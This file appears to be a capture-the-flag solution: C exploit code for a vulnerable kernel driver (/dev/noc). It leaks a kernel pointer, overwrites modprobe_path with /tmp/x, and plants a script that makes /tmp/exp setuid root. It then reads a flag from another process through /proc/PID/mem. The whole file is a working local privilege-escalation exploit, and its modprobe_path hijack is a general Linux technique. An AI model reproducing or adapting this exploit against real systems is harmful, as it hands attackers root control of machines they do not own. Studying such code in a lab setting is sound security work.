#define _GNU_SOURCE
#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <dirent.h>

#define IOC_LEAK 0x83170405

typedef struct {
    uint32_t proc_id;
    char proc_name[16];
    uint32_t mem_free;
    uint32_t mem_used;
    uint64_t mem_ptr;
} leak_data_t;

static uint64_t get_kernel_sym(const char *name) {
    FILE *fp = fopen("/tmp/coresysms.txt", "r");
    if (!fp) fp = fopen("/proc/kallsyms", "r");
    if (!fp) return 0;
    
    char row[512], sym_name[256], sym_type;
    unsigned long long sym_addr;
    
    while (fgets(row, sizeof(row), fp)) {
        if (sscanf(row, "%llx %c %255s", &sym_addr, &sym_type, sym_name) == 3) {
            if (!strcmp(sym_name, name)) {
                fclose(fp);
                return (uint64_t)sym_addr;
            }
        }
    }
    fclose(fp);
    return 0;
}

static int search_target_proc(void) {
    DIR *dp = opendir("/proc");
    if (!dp) return -1;
    
    struct dirent *ent;
    char link_path[128], real_path[256];
    
    while ((ent = readdir(dp))) {
        char *endp;
        long proc_id = strtol(ent->d_name, &endp, 10);
        if (*endp) continue;
        
        snprintf(link_path, sizeof(link_path), "/proc/%ld/exe", proc_id);
        ssize_t len = readlink(link_path, real_path, sizeof(real_path) - 1);
        if (len > 0) {
            real_path[len] = 0;
            if (!strcmp(real_path, "/home/eatFlag")) {
                closedir(dp);
                return (int)proc_id;
            }
        }
    }
    closedir(dp);
    return -1;
}

static void dump_secret(void) {
    int proc_id = search_target_proc();
    if (proc_id < 0) {
        printf("[-] target process not found\n");
        return;
    }
    printf("[*] located target at PID %d\n", proc_id);
    
    char mem_file[64];
    snprintf(mem_file, sizeof(mem_file), "/proc/%d/mem", proc_id);
    
    int fd = open(mem_file, O_RDONLY);
    if (fd < 0) {
        printf("[-] failed to access %s\n", mem_file);
        return;
    }
    
    uint64_t secret_ptr = 0;
    pread(fd, &secret_ptr, 8, 0x407148);
    printf("[*] secret location: 0x%lx\n", secret_ptr);
    
    char secret_data[0x110] = {0};
    pread(fd, secret_data, 0x100, (off_t)secret_ptr);
    printf("[!] FLAG: %s\n", secret_data);
    close(fd);
}

static void create_helper(const char *path, const char *script) {
    int fd = open(path, O_CREAT | O_TRUNC | O_WRONLY, 0777);
    write(fd, script, strlen(script));
    close(fd);
    chmod(path, 0777);
}

static void exec_trigger(void) {
    const char *trigger_file = "/tmp/dummy";
    int fd = open(trigger_file, O_CREAT | O_TRUNC | O_WRONLY, 0777);
    unsigned char header[4] = {0xff, 0xff, 0xff, 0xff};
    write(fd, header, 4);
    close(fd);
    chmod(trigger_file, 0777);
    system(trigger_file);
}

int main(void) {
    printf("[*] Exploit started\n");
    
    if (geteuid() == 0) {
        printf("[+] Already root, reading flag\n");
        dump_secret();
        return 0;
    }

    uint64_t target_sym = get_kernel_sym("modprobe_path");
    printf("[+] modprobe_path: 0x%lx\n", target_sym);
    
    int dev_fd = open("/dev/noc", O_RDWR);
    if (dev_fd < 0) {
        printf("[-] Cannot open /dev/noc\n");
        return 1;
    }
    
    leak_data_t leak = {0};
    ioctl(dev_fd, IOC_LEAK, &leak);
    uint64_t kern_buf = leak.mem_ptr;
    printf("[+] Kernel buffer: 0x%lx\n", kern_buf);

    char *padding = malloc(0x10000);
    memset(padding, 'A', 0x10000);
    write(dev_fd, padding, 0x10000);
    lseek(dev_fd, 0, SEEK_SET);
    write(dev_fd, padding, 0x20);
    free(padding);

    uint64_t offset = target_sym - kern_buf;
    uint64_t base_addr = offset & ~0xffULL;
    uint64_t rel_pos = offset & 0xffULL;
    uint64_t end_addr = base_addr + 1;

    printf("[+] diff: 0x%lx, start: 0x%lx, pos0: 0x%lx\n", offset, base_addr, rel_pos);

    char *exploit_buf = calloc(1, 0xffff);
    for (int idx = 0; idx < 7; idx++) {
        exploit_buf[idx] = (base_addr >> (8 * (idx + 1))) & 0xff;
    }
    memcpy(exploit_buf + 7, &end_addr, 8);
    lseek(dev_fd, 0x10001, SEEK_SET);
    write(dev_fd, exploit_buf, 0xffff);
    free(exploit_buf);

    char hijack_path[0x40] = {0};
    strcpy(hijack_path, "/tmp/x");
    lseek(dev_fd, (off_t)rel_pos, SEEK_SET);
    write(dev_fd, hijack_path, sizeof(hijack_path));
    close(dev_fd);

    printf("[+] modprobe_path overwritten to /tmp/x\n");

    create_helper("/tmp/x",
        "#!/bin/sh\n"
        "chown root:root /tmp/exp\n"
        "chmod 4755 /tmp/exp\n"
    );

    printf("[+] Triggering modprobe\n");
    exec_trigger();
    
    printf("[+] Executing suid exp\n");
    execl("/tmp/exp", "exp", NULL);
    return 0;
}
